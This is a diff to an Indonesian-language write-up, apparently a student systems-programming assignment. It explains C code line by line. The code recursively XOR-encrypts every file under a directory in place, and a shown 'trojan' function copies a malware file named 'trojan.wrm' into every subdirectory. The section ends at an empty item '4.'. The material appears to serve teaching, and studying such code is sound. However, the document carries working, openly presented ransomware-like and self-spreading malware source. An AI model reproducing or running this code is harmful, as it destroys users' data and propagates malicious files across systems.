@@ -566,12 +566,75 @@ void encrypt(const char *pathDasar, unsigned char kunci) {
 ```
 - `FILE *fp = fopen(lokasiFile, "rb+"); if (!fp) return;`  Membuka file dalam mode baca dan tulis biner.
 - `fseek(fp, 0, SEEK_END); long ukuranFile = ftell(fp); rewind(fp);` Digunakan untuk menentukan ukuran file. fseek memindahkan kursor ke akhir file, lalu ftell mengambil posisi kursor (yang berarti ukuran file). rewind mengembalikan posisi baca ke awal file.
-- `unsigned char *buffer = malloc(ukuranFile);
-if (!buffer) {
-    fclose(fp);
-    return;
-}`
-Mengalokasikan memori sebanyak ukuran file untuk menampung isi file.
+- `unsigned char *buffer = malloc(ukuranFile); if (!buffer) { fclose(fp); return; }` Mengalokasikan memori sebanyak ukuran file untuk menampung isi file.
+- `fread(buffer, 1, ukuranFile, fp); rewind(fp);` Membaca seluruh isi file ke dalam buffer, lalu kembali ke awal file.
+- `for (long i = 0; i < ukuranFile; i++) { buffer[i] ^= kunci; }` Melakukan operasi XOR terhadap setiap byte data dengan kunci untuk mengenkripsi
+- `fwrite(buffer, 1, ukuranFile, fp); fclose(fp); free(buffer);` Menulis ulang isi buffer yang sudah dienkripsi ke file, lalu menutup file dan membebaskan alokasi memori.
+
+- `struct dirent *entri; DIR *direktori = opendir(pathDasar); if (!direktori) return;` Membuka direktori berdasarkan path yang diberikan.
+- `while ((entri = readdir(direktori)) != NULL) { if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0) continue;` Membaca isi direktori satu per satu.
+- `snprintf(pathLengkap, sizeof(pathLengkap), "%s/%s", pathDasar, entri->d_name);` Membentuk path lengkap dari file atau folder yang sedang diproses.
+- `struct stat infoPath; if (stat(pathLengkap, &infoPath) == -1) continue;` Mengambil informasi tentang path tersebut.
+- `if (S_ISDIR(infoPath.st_mode)) { encrypt(pathLengkap, kunci); } else if (S_ISREG(infoPath.st_mode)) { encryptfile(pathLengkap, kunci);}` Jika entri adalah direktori, panggil encrypt lagi secara rekursif.
+
+3. Penyebaran Trojan ke Direktori dan Subdirektori
+```bash
+void trojan(const char *direktoriTarget, const char *lokasiMalware) {
+    DIR *dir = opendir(direktoriTarget);
+    if (!dir) return;
+
+    struct dirent *entri;
+    char path[1024];
+
+    while ((entri = readdir(dir)) != NULL) {
+        if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0)
+            continue;
+
+        snprintf(path, sizeof(path), "%s/%s", direktoriTarget, entri->d_name);
+
+        struct stat st;
+        if (stat(path, &st) == -1) continue;
+
+        if (S_ISDIR(st.st_mode)) {
+            trojan(path, lokasiMalware);
+        }
+    }
+
+    char pathTujuan[1024];
+    snprintf(pathTujuan, sizeof(pathTujuan), "%s/trojan.wrm", direktoriTarget);
+
+    FILE *src = fopen(lokasiMalware, "rb");
+    FILE *dst = fopen(pathTujuan, "wb");
+    if (src && dst) {
+        char buf[4096];
+        size_t jumlah;
+        while ((jumlah = fread(buf, 1, sizeof(buf), src)) > 0) {
+            fwrite(buf, 1, jumlah, dst);
+        }
+    }
+    if (src) fclose(src);
+    if (dst) fclose(dst);
+
+    closedir(dir);
+}
+```
+- `DIR *dir = opendir(direktoriTarget); if (!dir) return;` Membuka direktori target untuk dibaca.
+- `while ((entri = readdir(dir)) != NULL) { if (strcmp(entri->d_name, ".") == 0 || strcmp(entri->d_name, "..") == 0) continue;` Membaca setiap entri di dalam direktori.
+- `snprintf(path, sizeof(path), "%s/%s", direktoriTarget, entri->d_name);` Membentuk path lengkap dari entri direktori yang sedang diproses.
+- `struct stat st; if (stat(path, &st) == -1) continue;` Mendapatkan informasi tentang entri tersebut.
+- `if (S_ISDIR(st.st_mode)) { trojan(path, lokasiMalware); }` Memanggil fungsi trojan secara rekursif untuk menyebarkan malware ke subdirektori.
+- `char pathTujuan[1024]; snprintf(pathTujuan, sizeof(pathTujuan), "%s/trojan.wrm", direktoriTarget);` Menentukan path tujuan untuk malware.
+- `FILE *src = fopen(lokasiMalware, "rb");
+FILE *dst = fopen(pathTujuan, "wb");
+if (src && dst) {
+    char buf[4096];
+    size_t jumlah;
+    while ((jumlah = fread(buf, 1, sizeof(buf), src)) > 0) {
+        fwrite(buf, 1, jumlah, dst);
+    }
+}` Membuka file malware dari lokasiMalware dan membuka file tujuan trojan.wrm di direktori target. Kemudian, menyalin isi file malware ke dalam file tujuan.
+
+4. 
 
 
 
